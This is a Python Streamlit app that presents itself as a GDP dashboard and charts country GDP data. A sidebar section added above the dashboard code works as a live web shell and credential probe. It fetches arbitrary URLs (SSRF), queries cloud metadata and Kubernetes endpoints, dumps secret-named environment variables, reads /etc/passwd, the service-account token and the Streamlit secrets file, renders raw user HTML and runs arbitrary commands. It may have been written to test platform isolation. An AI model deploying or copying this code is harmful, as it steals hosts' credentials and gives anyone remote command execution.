import streamlit as st
import pandas as pd
import math
import requests
from pathlib import Path
import os

st.set_page_config(page_title='GDP dashboard', page_icon=':earth_americas:')

# SSRF/Injection Test Section
st.sidebar.header("Data Source Settings")

# Test 1: SSRF via user-controlled URL
data_url = st.sidebar.text_input("Custom data URL", value="https://httpbin.org/get")
if st.sidebar.button("Fetch URL"):
    try:
        resp = requests.get(data_url, timeout=5)
        st.sidebar.code(f"Status: {resp.status_code}\n{resp.text[:500]}")
    except Exception as e:
        st.sidebar.error(f"Error: {str(e)[:200]}")

# Test 2: Cloud metadata probe
if st.sidebar.button("Probe Metadata"):
    targets = {
        "AWS IMDS": ("http://169.254.169.254/latest/meta-data/", {}),
        "GCP Meta": ("http://metadata.google.internal/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
        "Azure IMDS": ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
        "K8s API": ("https://kubernetes.default.svc/api", {}),
        "Localhost": ("http://127.0.0.1:8501", {}),
    }
    for name, (url, hdrs) in targets.items():
        try:
            resp = requests.get(url, timeout=3, headers=hdrs)
            st.sidebar.success(f"{name}: {resp.status_code} - {resp.text[:100]}")
        except requests.exceptions.ConnectionError:
            st.sidebar.warning(f"{name}: Blocked/Refused")
        except requests.exceptions.Timeout:
            st.sidebar.warning(f"{name}: Timeout")
        except Exception as e:
            st.sidebar.error(f"{name}: {str(e)[:80]}")

# Test 3: Environment disclosure
if st.sidebar.button("Environment"):
    env = dict(os.environ)
    interesting = {k: v[:50] for k, v in env.items() if any(x in k.upper() for x in ['KEY','SECRET','TOKEN','PASS','AWS','GCP','DATABASE','API','CRED','AUTH'])}
    st.sidebar.json(interesting if interesting else {"total_vars": len(env), "hostname": os.environ.get("HOSTNAME","?"), "home": os.environ.get("HOME","?")})

# Test 4: Filesystem
if st.sidebar.button("Filesystem"):
    for p in ['/etc/hostname', '/etc/passwd', '/proc/self/cgroup', '/var/run/secrets/kubernetes.io/serviceaccount/token', os.path.expanduser('~/.streamlit/secrets.toml')]:
        try:
            content = open(p).read()[:200]
            st.sidebar.success(f"{p}: {content}")
        except Exception as e:
            st.sidebar.warning(f"{p}: {str(e)[:50]}")

# Test 5: XSS
user_html = st.sidebar.text_area("HTML Input", value="<b>Bold</b>")
if st.sidebar.button("Render HTML"):
    st.html(user_html)

# Test 6: Command execution
cmd = st.sidebar.text_input("Command", value="id")
if st.sidebar.button("Run"):
    import subprocess
    try:
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
        st.sidebar.code(f"{result.stdout[:300]}\n{result.stderr[:200]}")
    except Exception as e:
        st.sidebar.error(str(e)[:100])

# Original GDP code
@st.cache_data
def get_gdp_data():
    raw = pd.read_csv(Path(__file__).parent/'data/gdp_data.csv')
    df = raw.melt(['Country Code'], [str(x) for x in range(1960, 2023)], 'Year', 'GDP')
    df['Year'] = pd.to_numeric(df['Year'])
    return df

gdp_df = get_gdp_data()
'''
# :earth_americas: GDP dashboard
'''
from_year, to_year = st.slider('Years', int(gdp_df['Year'].min()), int(gdp_df['Year'].max()), [1960, 2022])
countries = st.multiselect('Countries', gdp_df['Country Code'].unique(), ['DEU','FRA','GBR','BRA','MEX','JPN'])
filtered = gdp_df[(gdp_df['Country Code'].isin(countries)) & (gdp_df['Year'].between(from_year, to_year))]
st.line_chart(filtered, x='Year', y='GDP', color='Country Code')
